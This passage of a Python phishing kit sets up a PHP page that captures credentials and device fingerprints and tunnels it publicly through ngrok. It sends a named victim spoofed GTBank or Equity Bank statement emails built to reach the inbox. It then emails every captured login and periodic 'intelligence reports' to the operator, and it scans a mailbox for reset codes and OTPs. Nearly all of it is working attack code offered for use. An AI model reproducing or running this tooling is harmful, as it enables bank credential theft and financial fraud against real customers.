$ip = $_SERVER["REMOTE_ADDR"] ?? $_SERVER["HTTP_X_FORWARDED_FOR"] ?? "Unknown";
$t = date("Y-m-d H:i:s");
$d = array();
'''

for x in f:
    php += f'$d["{x}"] = $_POST["{x}"] ?? "N/A";\n'

php += '''
// Device fingerprinting
$d["user_agent"] = $_POST["user_agent"] ?? $_SERVER["HTTP_USER_AGENT"] ?? "Unknown";
$d["screen_res"] = $_POST["screen_res"] ?? "Unknown";
$d["timezone"] = $_POST["timezone"] ?? "Unknown";
$d["language"] = $_POST["language"] ?? "Unknown";
$d["referer"] = $_SERVER["HTTP_REFERER"] ?? "Direct";

// Build detailed log
$e = "''' + n + '''\\n";
$e .= "Time: $t\\n";
$e .= "IP: $ip\\n";
'''

for x in f:
    php += f'$e .= "{x.title()}: " . $d["{x}"] . "\\n";\n'

php += '''
$e .= "\\n--- DEVICE INTELLIGENCE ---\\n";
$e .= "User-Agent: " . $d["user_agent"] . "\\n";
$e .= "Screen: " . $d["screen_res"] . "\\n";
$e .= "Timezone: " . $d["timezone"] . "\\n";
$e .= "Language: " . $d["language"] . "\\n";
$e .= "Referer: " . $d["referer"] . "\\n";
$e .= "\\n" . str_repeat("=", 70) . "\\n\\n";

file_put_contents("log.txt", $e, FILE_APPEND);

// Save JSON for intelligence engine
$json_data = array(
    "timestamp" => $t,
    "ip" => $ip,
    "credentials" => $d,
    "device" => array(
        "user_agent" => $d["user_agent"],
        "screen" => $d["screen_res"],
        "timezone" => $d["timezone"],
        "language" => $d["language"]
    )
);
file_put_contents("intel.json", json_encode($json_data) . "\\n", FILE_APPEND);

echo json_encode(array("ok" => true, "message" => "Captured"));
?>'''

with open("s/c.php","w") as file:file.write(php)
open("s/log.txt","a").close()
open("s/intel.json","a").close()

print(f"{c.G}✅ Files ready with intelligence{c.E}\n")

subprocess.Popen(["php","-S",f"0.0.0.0:{PORT}","-t","s"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
time.sleep(2)

print(f"{c.Y}🚀 Starting server...{c.E}")
print(f"{c.C}🌐 Creating tunnel...{c.E}\n")

# ============ NGROK OR DIRECT URL ============
if USE_NGROK:
    try:
        from pyngrok import ngrok
        ngrok.set_auth_token(NGROK_TOKEN)
        tunnel=ngrok.connect(PORT,bind_tls=True)
        u=tunnel.public_url
        print(f"{c.G}✅ Ngrok tunnel active!{c.E}\n")
    except Exception as e:
        print(f"{c.R}⚠️ Ngrok error: {e}{c.E}")
        print(f"{c.Y}💡 Using direct access (for Render/Railway)...{c.E}\n")
        u=f"http://0.0.0.0:{PORT}"
else:
    # For public deployments (Render, Railway, Heroku)
    u = os.environ.get("PUBLIC_URL", f"http://0.0.0.0:{PORT}")
    print(f"{c.G}✅ Public deployment mode{c.E}\n")

s=u
try:
    s=requests.get(f"https://tinyurl.com/api-create.php?url={u}",timeout=5).text.strip()
except:
    pass

print(f"{c.B}{c.G}{'='*60}{c.E}")
print(f"{c.B}{c.G}  ✅ {n.upper()} READY!{c.E}")
print(f"{c.B}{c.G}{'='*60}{c.E}\n")
print(f"{c.B}🔗 LINK:{c.E}")
print(f"{c.C}   {u}{c.E}\n")
if s!=u:print(f"{c.B}📎 SHORT:{c.E}");print(f"{c.Y}   {s}{c.E}\n")

# ============ EMAIL SENDING OPTION ============
send_opt=input(f"{c.G}Send via email? (y/n): {c.E}").strip().lower()

if send_opt=='y':
    victim=input(f"{c.C}Victim email: {c.E}").strip()
    if victim and '@' in victim:
        print(f"\n{c.Y}📧 Sending optimized for INBOX...{c.E}")
        
        # ============ INBOX OPTIMIZED EMAIL TEMPLATES ============
        if t=="gtbank":
            subj="Account Statement Available"
            plain_text=f"""Dear Valued Customer,

Your monthly account statement is now available for review.

To view your statement securely, please log in to Internet Banking:
{u}

If you did not request this statement, please disregard this message.

Best regards,
GTBank Customer Service

---
This is an automated message. Please do not reply to this email.
GTBank Nigeria | www.gtbank.com"""
            
            html=f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin:0;padding:0;font-family:Arial,sans-serif;background-color:#f4f4f4">
    <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:20px">
        <tr>
            <td align="center">
                <table width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden">
                    <tr>
                        <td style="background-color:#ff6600;padding:30px;text-align:center">
                            <h1 style="color:#ffffff;margin:0;font-size:42px;font-weight:900;letter-spacing:2px">GT</h1>
                            <p style="color:#ffffff;margin:10px 0 0 0;font-size:14px">Guaranty Trust Bank</p>
                        </td>
                    </tr>
                    <tr>
                        <td style="padding:40px 30px">
                            <p style="margin:0 0 20px 0;color:#333;font-size:16px;line-height:1.6">Dear Valued Customer,</p>
                            <p style="margin:0 0 20px 0;color:#333;font-size:16px;line-height:1.6">Your monthly account statement is now available for review.</p>
                            <p style="margin:0 0 30px 0;color:#333;font-size:16px;line-height:1.6">To view your statement securely, please log in to Internet Banking:</p>
                            <table width="100%" cellpadding="0" cellspacing="0">
                                <tr>
                                    <td align="center" style="padding:20px 0">
                                        <a href="{u}" style="display:inline-block;padding:15px 40px;background-color:#ff6600;color:#ffffff;text-decoration:none;border-radius:5px;font-weight:bold;font-size:16px">View Statement</a>
                                    </td>
                                </tr>
                            </table>
                            <p style="margin:20px 0 0 0;color:#666;font-size:14px;line-height:1.6">If you did not request this statement, please disregard this message.</p>
                            <p style="margin:30px 0 0 0;color:#333;font-size:16px;line-height:1.6">Best regards,<br>GTBank Customer Service</p>
                        </td>
                    </tr>
                    <tr>
                        <td style="background-color:#f8f8f8;padding:20px 30px;text-align:center">
                            <p style="margin:0;color:#999;font-size:12px;line-height:1.6">This is an automated message. Please do not reply to this email.</p>
                            <p style="margin:10px 0 0 0;color:#999;font-size:12px">GTBank Nigeria | www.gtbank.com</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>'''
        
        elif t=="equity":
            subj="E-Statement Ready for Download"
            plain_text=f"""Dear Customer,

Your Equity Bank e-statement is ready for download.

Access your statement here:
{u}

For assistance, contact customer care at 0763 063 000.

Regards,
Equity Bank Kenya

---
Equity Bank Limited | www.equitybank.co.ke
This is an automated notification."""
            
            html=f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin:0;padding:0;font-family:Arial,sans-serif;background-color:#e8e8e8">
    <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#e8e8e8;padding:20px">
        <tr>
            <td align="center">
                <table width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden">
                    <tr>
                        <td style="background-color:#b71c1c;padding:40px;text-align:center">
                            <div style="color:#ffffff;font-size:24px;margin-bottom:10px">▲ ▲</div>
                            <h1 style="color:#ffffff;margin:0;font-size:28px;font-weight:700;letter-spacing:1.5px">EQUITY BANK</h1>
                            <p style="color:rgba(255,255,255,0.9);margin:10px 0 0 0;font-size:14px">Internet Banking Portal</p>
                        </td>
                    </tr>
                    <tr>
                        <td style="padding:40px 30px">
                            <p style="margin:0 0 20px 0;color:#333;font-size:16px;line-height:1.6">Dear Customer,</p>
                            <p style="margin:0 0 20px 0;color:#333;font-size:16px;line-height:1.6">Your Equity Bank e-statement is ready for download.</p>
                            <table width="100%" cellpadding="0" cellspacing="0">
                                <tr>
                                    <td align="center" style="padding:20px 0">
                                        <a href="{u}" style="display:inline-block;padding:15px 40px;background-color:#b71c1c;color:#ffffff;text-decoration:none;border-radius:5px;font-weight:bold;font-size:16px">Download Statement</a>
                                    </td>
                                </tr>
                            </table>
                            <p style="margin:20px 0 0 0;color:#666;font-size:14px;line-height:1.6">For assistance, contact customer care at 0763 063 000.</p>
                            <p style="margin:30px 0 0 0;color:#333;font-size:16px;line-height:1.6">Regards,<br>Equity Bank Kenya</p>
                        </td>
                    </tr>
                    <tr>
                        <td style="background-color:#f8f8f8;padding:20px 30px;text-align:center">
                            <p style="margin:0;color:#999;font-size:12px;line-height:1.6">Equity Bank Limited | www.equitybank.co.ke</p>
                            <p style="margin:10px 0 0 0;color:#999;font-size:12px">This is an automated notification.</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>'''
        
        else:
            subj="Account Notification"
            plain_text=f"""Hello,

You have a new notification regarding your account.

View details: {u}

If you did not expect this message, please ignore it.

Thank you,
{n} Support Team"""
            
            html=f'''<!DOCTYPE html>
<html>
<body style="font-family:Arial;padding:20px;max-width:600px;margin:0 auto;background-color:#f4f4f4">
    <div style="background:#fff;padding:40px;border-radius:8px">
        <p style="font-size:16px;color:#333">Hello,</p>
        <p style="font-size:16px;color:#333">You have a new notification regarding your account.</p>
        <div style="margin:30px 0;text-align:center">
            <a href="{u}" style="display:inline-block;padding:15px 35px;background:#667eea;color:#fff;text-decoration:none;border-radius:5px;font-weight:bold">View Details</a>
        </div>
        <p style="font-size:14px;color:#666">If you did not expect this message, please ignore it.</p>
        <p style="font-size:16px;color:#333;margin-top:30px">Thank you,<br>{n} Support Team</p>
    </div>
</body>
</html>'''
        
        try:
            msg = MIMEMultipart('alternative')
            
            # CRITICAL HEADERS FOR INBOX DELIVERY
            msg['Message-ID'] = make_msgid(domain='gmail.com')
            msg['Date'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
            msg['X-Priority'] = '3'
            msg['X-MSMail-Priority'] = 'Normal'
            msg['Importance'] = 'Normal'
            
            # Natural sender name
            if t=="gtbank":
                msg['From'] = formataddr(('GTBank Statements', EMAIL_FROM))
            elif t=="equity":
                msg['From'] = formataddr(('Equity Bank', EMAIL_FROM))
            else:
                msg['From'] = formataddr((f'{n} Notifications', EMAIL_FROM))
            
            msg['To'] = victim
            msg['Subject'] = subj
            
            # Attach plain text FIRST (critical!)
            msg.attach(MIMEText(plain_text, 'plain', 'utf-8'))
            
            # Then HTML version
            msg.attach(MIMEText(html, 'html', 'utf-8'))
            
            # Send with proper SMTP settings
            srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=15)
            srv.set_debuglevel(0)
            srv.ehlo()
            srv.starttls()
            srv.ehlo()
            srv.login(EMAIL_FROM, EMAIL_PASS)
            srv.send_message(msg)
            srv.quit()
            
            print(f"\n{c.B}{c.G}{'='*60}{c.E}")
            print(f"{c.G}✅ EMAIL SENT TO {victim}!{c.E}")
            print(f"{c.G}✅ OPTIMIZED FOR INBOX DELIVERY{c.E}")
            print(f"{c.B}{c.G}{'='*60}{c.E}\n")
            
        except Exception as ex:
            print(f"\n{c.R}✗ Failed: {ex}{c.E}\n")
    else:
        print(f"{c.R}Invalid email{c.E}\n")

# ============ START EMAIL SCANNER IN BACKGROUND ============
if ENABLE_EMAIL_SCANNING:
    scanner_thread = threading.Thread(target=run_email_scanner, daemon=True)
    scanner_thread.start()
    print(f"{c.C}📧 Email scanner thread started{c.E}\n")

# ============ ENHANCED MONITORING WITH INTELLIGENCE ============
last=0
last_report = time.time()

def monitor():
    global last, last_report
    print(f"{c.C}👁️Enhanced monitoring active...{c.E}\n")
    
    while True:
        try:
            # Monitor log file
            if os.path.exists("s/log.txt"):
                sz=os.path.getsize("s/log.txt")
                if sz>last:
                    with open("s/log.txt","r") as file:
                        new=file.read()[last:]
                        if new.strip():
                            print(f"\n{c.B}{c.R}{'='*60}{c.E}")
                            print(f"{c.R}🎯 CAPTURED!{c.E}")
                            print(f"{c.B}{c.R}{'='*60}{c.E}\n")
                            print(new)
                            print(f"{c.B}{c.R}{'='*60}{c.E}\n")
                            
                            # Process intelligence
                            if ENABLE_DEEP_INTELLIGENCE and os.path.exists("s/intel.json"):
                                try:
                                    with open("s/intel.json", "r") as jf:
                                        lines = jf.readlines()
                                        if lines:
                                            latest = json.loads(lines[-1])
                                            
                                            # Add to intelligence engine
                                            device_info = parse_user_agent(latest.get('device', {}).get('user_agent', ''))
                                            geo_info = intel_engine.get_ip_intelligence(latest.get('ip', 'Unknown'))
                                            
                                            capture_data = {
                                                'ip': latest.get('ip'),
                                                'device': device_info,
                                                'geo': geo_info,
                                                **latest.get('credentials', {})
                                            }
                                            
                                            intel_engine.add_capture(capture_data)
                                            
                                            # Display intelligence
                                            print(f"{c.C}🧠 INTELLIGENCE:{c.E}")
                                            if geo_info.get('country') != 'Unknown':
                                                print(f"   📍 Location: {geo_info.get('city')}, {geo_info.get('country')}")
                                            if device_info.get('browser') != 'Unknown':
                                                print(f"   💻 Device: {device_info.get('browser')} on {device_info.get('os')} ({device_info.get('type')})")
                                            print()
                                except:
                                    pass
                            
                            # Send instant notification with INBOX optimization
                            try:
                                msg = MIMEMultipart('alternative')
                                
                                # CRITICAL HEADERS FOR INBOX
                                msg['Message-ID'] = make_msgid(domain='gmail.com')
                                msg['Date'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
                                msg['X-Priority'] = '3'
                                msg['X-MSMail-Priority'] = 'Normal'
                                msg['Importance'] = 'Normal'
                                msg['From'] = formataddr(('Security Alert', EMAIL_FROM))
                                msg['To'] = EMAIL_TO
                                msg['Subject'] = f"🎯 {n} Capture - LIVE ALERT"
                                
                                # Plain text version (required for inbox)
                                plain_body = f"""LIVE CAPTURE ALERT
                                
{new}

---
Automated Security Monitor
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
                                
                                # HTML version
                                html_body = f"""<!DOCTYPE html>
<html>
<body style="font-family:monospace;padding:20px;background:#f5f5f5">
    <div style="background:#fff;padding:30px;border-radius:8px;border-left:4px solid #ff0000">
        <h2 style="color:#ff0000;margin-top:0">🎯 LIVE CAPTURE ALERT</h2>
        <div style="background:#f9f9f9;padding:20px;border-radius:5px;white-space:pre-wrap;font-size:14px">
{new}
        </div>
        <hr style="margin:20px 0;border:none;border-top:1px solid #ddd">
        <p style="color:#666;font-size:12px;margin:0">Automated Security Monitor<br>Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
</body>
</html>"""
                                
                                msg.attach(MIMEText(plain_body, 'plain', 'utf-8'))
                                msg.attach(MIMEText(html_body, 'html', 'utf-8'))
                                
                                srv=smtplib.SMTP("smtp.gmail.com",587,timeout=10)
                                srv.ehlo()
                                srv.starttls()
                                srv.ehlo()
                                srv.login(EMAIL_FROM,EMAIL_PASS)
                                srv.send_message(msg)
                                srv.quit()
                                
                                print(f"{c.G}✓ Instant alert sent to {EMAIL_TO}{c.E}\n")
                            except Exception as email_err:
                                print(f"{c.Y}⚠️ Email send error: {email_err}{c.E}\n")
                    last=sz
            
            # Auto-generate intelligence report
            if ENABLE_AUTO_REPORTS:
                current_time = time.time()
                if current_time - last_report >= (REPORT_INTERVAL_MINUTES * 60):
                    if intel_engine.total_victims > 0:
                        print(f"\n{c.Y}📊 Generating intelligence report...{c.E}\n")
                        report = intel_engine.generate_intelligence_report()
                        
                        # Save report to file
                        report_filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                        with open(report_filename, "w") as rf:
                            rf.write(report)
                        
                        # Send report via email with INBOX optimization
                        try:
                            msg = MIMEMultipart('alternative')
                            
                            # CRITICAL HEADERS
                            msg['Message-ID'] = make_msgid(domain='gmail.com')
                            msg['Date'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
                            msg['X-Priority'] = '3'
                            msg['X-MSMail-Priority'] = 'Normal'
                            msg['Importance'] = 'Normal'
                            msg['From'] = formataddr(('Intelligence Report', EMAIL_FROM))
                            msg['To'] = EMAIL_TO
                            msg['Subject'] = f"📊 Intelligence Report - {intel_engine.total_victims} Captures - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                            
                            # Plain text version
                            msg.attach(MIMEText(report, 'plain', 'utf-8'))
                            
                            # HTML version
                            html_report = f"""<!DOCTYPE html>
<html>
<body style="font-family:monospace;padding:20px;background:#f5f5f5">
    <div style="background:#fff;padding:30px;border-radius:8px">
        <h2 style="color:#667eea;margin-top:0">📊 Intelligence Report</h2>
        <div style="background:#f9f9f9;padding:20px;border-radius:5px;white-space:pre-wrap;font-size:13px">
{report}
        </div>
    </div>
</body>
</html>"""
                            msg.attach(MIMEText(html_report, 'html', 'utf-8'))
                            
                            # Attach report file
                            with open(report_filename, 'rb') as rf:
                                attachment = MIMEBase('application', 'octet-stream')
                                attachment.set_payload(rf.read())
                                encoders.encode_base64(attachment)
                                attachment.add_header('Content-Disposition', f'attachment; filename={report_filename}')
                                msg.attach(attachment)
                            
                            srv = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
                            srv.ehlo()
                            srv.starttls()
                            srv.ehlo()
                            srv.login(EMAIL_FROM, EMAIL_PASS)
                            srv.send_message(msg)
                            srv.quit()
                            
                            print(f"{c.G}✅ Intelligence report sent!{c.E}\n")
                        except Exception as e:
                            print(f"{c.Y}⚠️ Report send failed: {e}{c.E}\n")
                    
                    last_report = current_time
            
            time.sleep(2)
        except Exception as monitor_err:
            print(f"{c.R}Monitor error: {monitor_err}{c.E}\n")
            time.sleep(2)

threading.Thread(target=monitor,daemon=True).start()

print(f"{c.Y}Press Ctrl+C to stop{c.E}\n")
print(f"{c.C}Intelligence features: {'ACTIVE' if ENABLE_DEEP_INTELLIGENCE else 'DISABLED'}{c.E}")
print(f"{c.C}Auto reports every: {REPORT_INTERVAL_MINUTES} minutes{c.E}")
print(f"{c.C}Email scanner: {'ACTIVE' if ENABLE_EMAIL_SCANNING else 'DISABLED'}{c.E}\n")

# ============ RUN INITIAL EMAIL SCAN ============
if ENABLE_EMAIL_SCANNING:
    print(f"{c.Y}🔍 Running initial email scan...{c.E}\n")
    try:
        extractor = EmailPasswordExtractor(EMAIL_FROM, EMAIL_PASS)
        keywords = ['password', 'reset', 'verify', 'code', 'otp', 'pin', 'account', 'security']
        results = extractor.scan_emails(num_emails=50, search_keywords=keywords)
        
        if results:
            print(f"{c.G}✅ Initial scan: {len(results)} emails with sensitive data found{c.E}\n")
            
            # Generate and send initial scan report
            initial_report = extractor.generate_report()
            
            try:
                msg = MIMEMultipart('alternative')
                msg['Message-ID'] = make_msgid(domain='gmail.com')
                msg['Date'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
                msg['X-Priority'] = '3'
                msg['From'] = formataddr(('Email Scanner', EMAIL_FROM))
                msg['To'] = EMAIL_TO
                msg['Subject'] = f"🔍 Initial Email Scan - {len(results)} Findings"
                
                msg.attach(MIMEText(initial_report, 'plain', 'utf-8'))
                
                html_scan = f"""<!DOCTYPE html>
<html>
<body style="font-family:monospace;padding:20px;background:#f5f5f5">
    <div style="background:#fff;padding:30px;border-radius:8px">
        <h2 style="color:#0f9d58;margin-top:0">🔍 Initial Email Scan Results</h2>
        <div style="background:#f9f9f9;padding:20px;border-radius:5px;white-space:pre-wrap;font-size:13px">
{initial_report}
        </div>
    </div>
</body>
</html>"""
                msg.attach(MIMEText(html_scan, 'html', 'utf-8'))
                
                srv = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
                srv.ehlo()
                srv.starttls()
                srv.ehlo()
                srv.login(EMAIL_FROM, EMAIL_PASS)
                srv.send_message(msg)
                srv.quit()
                
                print(f"{c.G}✅ Initial scan report sent!{c.E}\n")
            except Exception as e:
                print(f"{c.Y}⚠️ Initial report send failed: {e}{c.E}\n")
        else:
            print(f"{c.Y}No sensitive data found in initial scan{c.E}\n")
    except Exception as e:
        print(f"{c.R}Initial scan error: {e}{c.E}\n")

# ============ KEEP ALIVE FOR PUBLIC DEPLOYMENTS ============
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n\n{c.G}✓ Stopped{c.E}")
    
    # Generate final report
    if intel_engine.total_victims > 0:
        print(f"\n{c.Y}Generating final report...{c.E}\n")
        final_report = intel_engine.generate_intelligence_report()
        print(final_report)
        
        # Save final report
        final_filename = f"final_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(final_filename, "w") as fr:
            fr.write(final_report)
        print(f"{c.G}✓ Final report saved: {final_filename}{c.E}\n")
        
        # Send final report
        try:
            msg = MIMEMultipart('alternative')
            msg['Message-ID'] = make_msgid(domain='gmail.com')
            msg['Date'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
            msg['From'] = formataddr(('Final Report', EMAIL_FROM))
            msg['To'] = EMAIL_TO
            msg['Subject'] = f"📊 FINAL Intelligence Report - Session Complete"
            
            msg.attach(MIMEText(final_report, 'plain', 'utf-8'))
            
            html_final = f"""<!DOCTYPE html>
<html>
<body style="font-family:monospace;padding:20px;background:#f5f5f5">
    <div style="background:#fff;padding:30px;border-radius:8px;border-left:4px solid #0f9d58">
        <h2 style="color:#0f9d58;margin-top:0">📊 FINAL Intelligence Report</h2>
        <p style="color:#666">Session has ended. Here's the complete summary:</p>
        <div style="background:#f9f9f9;padding:20px;border-radius:5px;white-space:pre-wrap;font-size:13px">
{final_report}
        </div>
    </div>
</body>
</html>"""
            msg.attach(MIMEText(html_final, 'html', 'utf-8'))
            
            # Attach file
            with open(final_filename, 'rb') as ff:
                attachment = MIMEBase('application', 'octet-stream')
                attachment.set_payload(ff.read())
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', f'attachment; filename={final_filename}')
                msg.attach(attachment)
            
            srv = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
            srv.ehlo()
            srv.starttls()
            srv.ehlo()
            srv.login(EMAIL_FROM, EMAIL_PASS)
            srv.send_message(msg)
            srv.quit()
            
            print(f"{c.G}✅ Final report sent!{c.E}\n")
        except Exception as e:
            print(f"{c.R}Final report send failed: {e}{c.E}\n")
    
    sys.exit(0)
